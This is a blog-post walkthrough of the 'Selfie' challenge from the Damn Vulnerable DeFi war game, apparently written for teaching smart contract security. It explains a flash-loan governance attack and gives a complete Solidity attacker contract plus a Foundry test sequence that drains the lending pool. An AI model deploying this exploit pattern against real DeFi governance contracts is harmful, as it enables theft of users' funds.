---
title: 'Damn Vulnerable DeFi Challenge #6 Solution — Selfie'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>We start with zero DVT token, and our end goal is to drain all the DVT funds present in the Lending Pool.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2022-04-23T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

This is Part 6 of the ["Let’s play Damn Vulnerable DeFi CTF"](https://stermi.xyz/blog/lets-play-damn-vulnerable-defi) series, where I will explain how to solve each challenge.

> [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.
> Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #6  —  Selfie

> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.
>
> Wow, and it even includes a really fancy governance mechanism to control it.
>
> What could go wrong, right ?
>
> You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/selfie)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/selfie/selfie.challenge.js)

## The attacker end goal

We start with zero DVT token, and our end goal is to drain all the DVT funds present in the Lending Pool.

## Study the contracts

### `DamnValuableTokenSnapshot.sol`

This contract extends [OpenZeppelin ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot). Quoting from the official documentation:

> This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and total supply at the time are recorded for later access.
>
> This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting. In naive implementations it’s possible to perform a “double spend” attack by reusing the same balance from different accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be used to create an efficient ERC20 forking mechanism.

We can think about it as the DVT token we have seen in the previous challenges, but with in addiction the Governance's mechanism to take snapshots.

This specific token is used by both the `SelfiePool` and `SimpleGovernance`

- `SelfiePool` allows flash loans of DVT token
- `SimpleGovernance` uses the DVT token to check if a user has enough votes (user balance must be more than half of the total supply of DVT tokens in the previous snapshot) to queue an action

The contract has three functions:

- `function snapshot() public returns (uint256)` that allow anyway to take a snapshot of the current DVT governance token. It will return the ID of the snapshot taken.
- `function getBalanceAtLastSnapshot(address account) external view returns (uint256)` a getter function that return the balance of the specified `account` at the last snapshot time
- `function getTotalSupplyAtLastSnapshot() external view returns (uint256)` a getter function that returns the total supply of governance token at the last snapshot time

### `SimpleGovernance.sol`

This is the governance contract that have the ability to propose actions and execute them.

Only the Governance is able to call the `SelfiePool.drainAllFunds(receiver)` function that would transfer all the DVT token present in the pool to the `receiver` address.

Let’s review the functions implemented in this contract:

- `function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256)` this function will add a proposal to the queue. The proposal will be added **only** if the `msg.sender`(the proposer) has enough voting power (owns more than half of the total DVT supply on the last snapshot time) and if the **receiver** is not the Governance contract itself
- `function executeAction(uint256 actionId) external payable` this function will execute a queued action. The action will be executed only if enough time has passed since the action’s proposal time (at least two days)

When an action is executed this code will be executed by the Governance smart contract:

```solidity
actionToExecute.receiver.functionCallWithValue(
    actionToExecute.data,
    actionToExecute.weiAmount
);
```

### `SelfiePool.sol`

This is lending pool contract where 1.5M of DVT tokens have been deposited. It’s a pretty standard lending pool contract with a flash loan method without fees.

The only odd method that we find is

```solidity
function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
}
```

If we look at the `onlyGovernance` function modifier

```solidity
modifier onlyGovernance() {
    require(msg.sender == address(governance), "Only governance can execute this action");
    _;
}
```

We can assume that the function can be executed only by the Governance contract.

## Solution code

Let’s recap everything. Our goal is to be able to call `SelfiePool.drainAllFunds` to be able to bribe all the funds.

In order to do that we need sender of the contract must be equal to the `governance` address but there’s no way to change the value of the `governance` that is written only on the contract’s `constructor`.

So the only way to call `drainAllFunds` is to make the Governance contract itself call the function directly.

Are you starting to see where we’re going?

We don’t have direct control on the Governance but what we can do is to create a proposal that will make the Governance itself call the `SelfiePool.drainAllFunds`. The only requirement is to have enough votes to pass the `queueAction` requirements.

If only there was an easy and free (without fees) way to access to a lot of governance tokens for just an istant… Do you have a guess where we could access those tokens?

Yup! We can borrow them directly from the same lending pool we are going to drain the next block!

That’s what we’re planning to do

1.  flash loan all the DVT available on the pool
2.  trigger a `snapshot` on the `DamnValuableTokenSnapshot` contract
3.  call `queueAction` on `SimpleGovernance` contract to create an action to call `drainAllFunds` on the pool
4.  Return the DVT we have borrowed from the pool
5.  Wait two days and call `executeAction` on the Governance contract

Here’s the code of the Attacker’s contract explained in the section above.

```solidity
// Do not use this code
// Part of the https://www.damnvulnerabledefi.xyz/ challenge

contract Executor {
    using Address for address payable;

    SimpleGovernance governance;
    SelfiePool pool;
    address owner;
    uint256 public drainActionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool) {
        owner = msg.sender;
        governance = _governance;
        pool = _pool;
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external payable {
        // only the pool can this function triggered by a flashloan call
        require(msg.sender == address(pool), "only pool");

        // we prepare the data payload to be attached to the governance action
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner)
        );

        // we take a snapshot of the governance token so we will be the bigger staker
        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        // we queue the action on the Governance contract
        drainActionId = governance.queueAction(address(pool), data, 0);

        // transfer back funds
        DamnValuableTokenSnapshot(tokenAddress).transfer(address(pool), borrowAmount);
    }

    function borrow(uint256 borrowAmount) external {
        // only the onwer can trigger a flashloan call to the pool
        require(msg.sender == owner, "only owner");

        // we call the flashloan function. The flashloan callback is handled by the `receiveTokens` function above
        pool.flashLoan(borrowAmount);
    }

}
```

The Executor contrat is executed by our main test like this

```solidity
// (foundry) Sets all subsequent calls' msg.sender to be the input address
vm.startPrank(attacker);
// deploy the executor contract
Executor executor = new Executor(governance, pool);
// start the attacking sequence
executor.borrow(TOKENS_IN_POOL);
// (foundry) warp time to be able to execute the drain action
// the action can be executed only after two days since the proposal
utils.mineTime(governance.getActionDelay());
// call the governance contract and execute the action
governance.executeAction(executor.drainActionId());
// (foundry) Resets subsequent calls' msg.sender to be `address(this)`
vm.stopPrank();
```

You can find the full solution on GitHub, looking at [SelfieTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/selfie/SelfieTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract SelfieTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
